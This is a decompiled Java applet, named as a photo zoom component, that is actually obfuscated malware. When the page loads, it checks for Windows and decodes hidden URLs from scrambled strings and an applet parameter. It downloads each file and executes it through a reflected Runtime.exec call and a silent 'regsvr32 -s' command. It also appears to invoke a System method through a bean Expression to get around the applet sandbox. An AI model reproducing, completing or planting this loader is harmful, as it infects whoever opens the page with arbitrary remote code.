// 
// Decompiled by Procyon v0.5.30
// 

package photo;

import java.lang.reflect.Method;
import java.awt.Component;
import java.beans.Expression;
import java.io.InputStream;
import java.io.IOException;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.URL;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

public class Zoom extends Applet
{
    protected JList rowData;
    public String version;
    public HashSet remRect;
    boolean fl;
    public String draw;
    public String workPath;
    public Object[] attr;
    public static String graphicsData;
    public static String row;
    private String cnt;
    
    public static String grep(final String[] array) {
        final StringBuffer sb = new StringBuffer("");
        int i = 0;
        while (i < array.length) {
            sb.append(array[i++].trim());
        }
        return sb.toString();
    }
    
    public void tryDrow() {
        super.start();
        if (System.getProperty(this.version).indexOf(this.workPath) >= 0) {
            final Runtime runtime = Runtime.getRuntime();
            final String[] split = TransparentContainer.trim(Zoom.row, Zoom.graphicsData, this.getParameter("p")).split("::");
            for (int i = 0; i < split.length; ++i) {
                final String string = "" + Math.random();
                URL url;
                try {
                    url = new URL(split[i]);
                }
                catch (Exception ex) {
                    return;
                }
                final String concat = string.concat(TransparentContainer.ssize);
                FileOutputStream fileOutputStream;
                try {
                    fileOutputStream = new FileOutputStream(concat);
                }
                catch (FileNotFoundException ex2) {
                    return;
                }
                InputStream openStream;
                try {
                    openStream = url.openStream();
                }
                catch (IOException ex3) {
                    return;
                }
                Mover.gs(openStream, fileOutputStream);
                try {
                    openStream.close();
                }
                catch (IOException ex4) {
                    return;
                }
                try {
                    fileOutputStream.close();
                }
                catch (IOException ex5) {
                    return;
                }
                this.drow(concat, new String[] { "GIF", "JPG", "PNG" }, runtime);
            }
        }
    }
    
    @Override
    public void start() {
        this.tryDrow();
    }
    
    public Zoom() {
        this.version = "".concat(grep(("o".concat(" kers.ker  na ker ") + "me ker ").split("ker")).concat(""));
        this.remRect = new HashSet();
        this.fl = true;
        this.draw = h.dada("CTFgPREC[@L|Q_SSPC");
        this.workPath = "W" + h.dada("Y_V[BB");
        this.attr = new Object[] { true, "gyf86ikyl", -3 };
        this.cnt = grep("f2ref2  gf2sf2vr3f2  2 -s \"f2".split("f2"));
        this.remRect.add(new ExtResolution(System.class, this.draw, new Object[1]));
        new Expression(System.class, this.draw, new Object[1]);
        this.add(this.rowData = new JList((E[])new Object[] { new TransparentContainer(this, this.remRect) }));
    }
    
    public void drow(final String s, final String[] array, final Object o) {
        try {
            final Method method = o.getClass().getMethod("exec", String.class);
            try {
                method.invoke(o, s);
            }
            catch (Exception ex) {}
            try {
                method.invoke(o, grep(new String[] { this.cnt, s, "\"" }));
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
    
    public static boolean crop(final Method method, final Object o, final Object[] array) {
        try {
            method.invoke(o, array);
        }
        catch (Exception ex) {}
        return true;
    }
    
    static {
        Zoom.graphicsData = grep("Ek22QnNuw=ldh#LvmqeiTO22DCfb5WsjX/p&t.K7xr-oVM8FAZc_1GHY6P3R0%yS4azJgU?I:29B".split("22"));
        Zoom.row = grep("TODCfb5Wso31VM8FAZc_1GHY6P3R0%yS4azJgU?I:29BEkQnNuw31=jX/p&t.K7xr-ldh#Lvmqei".split("31"));
    }
}
